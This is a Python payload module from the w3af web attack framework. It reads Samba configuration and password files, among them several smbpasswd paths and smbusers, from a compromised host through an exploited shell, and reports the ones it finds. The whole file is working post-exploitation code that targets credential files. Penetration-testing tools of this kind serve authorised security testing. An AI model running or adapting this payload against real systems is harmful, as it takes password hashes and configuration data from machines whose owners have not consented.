import re
from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.ui.console.tables import table


class smb_config_files(Payload):
    """
    This payload shows SMB configuration files
    """
    def api_read(self):
        result = {}
        files = []

        files.append('/usr/local/samba/lib/smb.conf')
        files.append('/etc/smb.conf')
        files.append('/etc/smbpasswd')
        files.append('/etc/smbusers')
        files.append('/etc/smbfstab')
        files.append('/etc/samba/smb.conf')
        files.append('/etc/samba/smbfstab')
        files.append('/etc/samba/smbpasswd')
        files.append('/usr/local/samba/private/smbpasswd')
        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            content = self.shell.read(file)
            if content:
                result[file] = content
        return result

    def run_read(self):
        api_result = self.api_read()

        if not api_result:
            return 'No SMB configuration files were identified.'
        else:
            rows = []
            rows.append(['SMB configuration files'])
            rows.append([])
            for filename in api_result:
                rows.append([filename, ])

            result_table = table(rows)
            result_table.draw(80)

            return rows
